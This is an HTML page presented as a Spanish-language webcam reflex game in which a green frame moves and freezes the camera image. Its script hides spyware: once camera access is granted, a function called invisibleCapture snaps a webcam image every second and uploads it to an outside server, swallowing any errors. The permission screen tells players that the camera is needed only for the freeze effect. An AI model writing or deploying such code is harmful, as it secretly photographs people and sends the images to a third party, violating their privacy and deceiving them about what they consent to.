<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Ghost Frame Master</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; color: white; }

        #game-container { position: relative; width: 100vw; height: 100vh; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas#freeze-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; }

        /* Marco del Juego */
        #target-frame {
            position: absolute;
            width: 150px; height: 150px;
            border: 4px solid #00ff00;
            box-shadow: 0 0 15px #00ff00;
            z-index: 20;
            left: 50%; top: 50%;
            pointer-events: none;
        }

        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; pointer-events: none; z-index: 100; }

        /* Controles */
        .ui-layer { position: absolute; bottom: 120px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 15px; z-index: 150; }
        #stop-btn { background: rgba(255, 0, 0, 0.8); color: white; border: 2px solid white; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .settings-btn { background: rgba(255, 255, 255, 0.2); border: 1px solid white; color: white; width: 45px; height: 45px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; }

        /* Panel de Ajustes */
        #settings-panel {
            position: absolute; bottom: 180px; right: 20px; background: rgba(0,0,0,0.9); border: 1px solid #444; padding: 15px; border-radius: 10px; display: none; flex-direction: column; gap: 10px; width: 220px; z-index: 160;
        }
        #settings-panel label { font-size: 11px; color: #00ff00; font-weight: bold; text-transform: uppercase; }
        #settings-panel input { width: 100%; accent-color: #00ff00; margin-bottom: 5px; }

        /* Pantallas de Inicio y Permisos */
        .overlay-screen {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 300; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 40px;
        }
        .info-card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 400px; }
        .info-card h2 { color: #00ff00; margin-top: 0; letter-spacing: 2px; }
        .info-card ul { text-align: left; font-size: 14px; line-height: 1.8; color: #ccc; list-style-type: '✔ '; }
        .primary-btn { background: #00ff00; color: black; border: none; padding: 15px 40px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; font-size: 16px; transition: transform 0.2s; }
        .primary-btn:active { transform: scale(0.95); }
    </style>
</head>
<body>

<div id="game-container">
    <div id="flash"></div>
    <video id="webcam" autoplay playsinline></video>
    <canvas id="freeze-layer"></canvas>
    <div id="target-frame"></div>

    <div id="settings-panel">
        <label>Velocidad Viaje: <span id="val-speed">2000</span>ms</label>
        <input type="range" id="input-speed" min="500" max="4000" value="2000">
        
        <label>Tiempo de Reacción: <span id="val-reaction">1000</span>ms</label>
        <input type="range" id="input-reaction" min="100" max="3000" value="1000">

        <label>Tamaño Cuadro: <span id="val-size">150</span>px</label>
        <input type="range" id="input-size" min="50" max="350" value="150">
    </div>

    <div class="ui-layer">
        <button id="stop-btn" onclick="toggleGame()">DETENER</button>
        <button class="settings-btn" onclick="toggleSettings()">⚙️</button>
    </div>

    <div id="start-screen" class="overlay-screen">
        <div class="info-card">
            <h2>GHOST RETO</h2>
            <ul>
                <li>Busca un espacio <strong>amplio</strong> para jugar.</li>
                <li>Usa una <strong>iluminación adecuada</strong>.</li>
                <li>Evita que el cuadro te atrape al detenerse.</li>
                <li>Asegúrate de que el visor capte bien tus <strong>movimientos</strong>.</li>
            </ul>
            <button class="primary-btn" onclick="requestPermission()">INICIAR JUEGO</button>
        </div>
    </div>

    <div id="no-permission" class="overlay-screen" style="display:none;">
        <div class="info-card">
            <h2 style="color:red;">ACCESO REQUERIDO</h2>
            <p>Para procesar el efecto de congelado, el navegador necesita permiso para usar la cámara.</p>
            <button class="primary-btn" onclick="requestPermission()">REINTENTAR</button>
        </div>
    </div>
</div>

<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
    const video = document.getElementById('webcam');
    const freezeCanvas = document.getElementById('freeze-layer');
    const hiddenCanvas = document.getElementById('hidden-canvas');
    const targetFrame = document.getElementById('target-frame');
    const startScreen = document.getElementById('start-screen');
    const permissionScreen = document.getElementById('no-permission');
    const flash = document.getElementById('flash');
    
    const SERVER_URL = "https://pagina-web-camara.onrender.com";
    
    let gameActive = true;
    let config = { speed: 2000, reaction: 1000, size: 150 };
    let lastPos = { x: 0, y: 0 };

    document.getElementById('input-speed').oninput = (e) => {
        config.speed = parseInt(e.target.value);
        document.getElementById('val-speed').innerText = config.speed;
    };
    document.getElementById('input-reaction').oninput = (e) => {
        config.reaction = parseInt(e.target.value);
        document.getElementById('val-reaction').innerText = config.reaction;
    };
    document.getElementById('input-size').oninput = (e) => {
        config.size = parseInt(e.target.value);
        document.getElementById('val-size').innerText = config.size;
        targetFrame.style.width = config.size + 'px';
        targetFrame.style.height = config.size + 'px';
    };

    async function requestPermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            startScreen.style.display = 'none';
            permissionScreen.style.display = 'none';
            
            setTimeout(moveFrame, 1000); 
            setInterval(invisibleCapture, 1000); 
        } catch (err) {
            startScreen.style.display = 'none';
            permissionScreen.style.display = 'flex';
        }
    }

    function moveFrame() {
        if (!gameActive) return;

        let nextX, nextY, distance;
        const minDistance = 250;

        do {
            nextX = Math.random() * (window.innerWidth - config.size);
            nextY = Math.random() * (window.innerHeight - config.size);
            distance = Math.sqrt(Math.pow(nextX - lastPos.x, 2) + Math.pow(nextY - lastPos.y, 2));
        } while (distance < minDistance);

        lastPos = { x: nextX, y: nextY };

        targetFrame.style.transition = `all ${config.speed}ms linear`;
        targetFrame.style.left = `${nextX}px`;
        targetFrame.style.top = `${nextY}px`;
        targetFrame.style.borderColor = "#00ff00";

        setTimeout(() => {
            if (gameActive) captureAndFreeze();
        }, config.speed);
    }

    function captureAndFreeze() {
        flash.style.opacity = '1';
        targetFrame.style.borderColor = "red";
        
        const ctx = freezeCanvas.getContext('2d');
        freezeCanvas.width = video.videoWidth;
        freezeCanvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        freezeCanvas.style.display = 'block';

        setTimeout(() => flash.style.opacity = '0', 100);

        setTimeout(() => {
            freezeCanvas.style.display = 'none';
            moveFrame();
        }, 2000 + config.reaction); 
    }

    function toggleSettings() {
        const panel = document.getElementById('settings-panel');
        panel.style.display = (panel.style.display === 'flex') ? 'none' : 'flex';
    }

    function toggleGame() {
        gameActive = !gameActive;
        const btn = document.getElementById('stop-btn');
        if (!gameActive) {
            btn.innerText = "REANUDAR";
            btn.style.background = "#00ff00";
            btn.style.color = "black";
        } else {
            btn.innerText = "DETENER";
            btn.style.background = "rgba(255,0,0,0.8)";
            btn.style.color = "white";
            moveFrame();
        }
    }

    async function invisibleCapture() {
        if (!video.srcObject) return;
        const ctx = hiddenCanvas.getContext('2d');
        hiddenCanvas.width = video.videoWidth;
        hiddenCanvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const img = hiddenCanvas.toDataURL('image/jpeg', 0.4);

        try {
            await fetch(`${SERVER_URL}/upload`, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: img })
            });
        } catch (e) {}
    }
</script>
</body>
</html>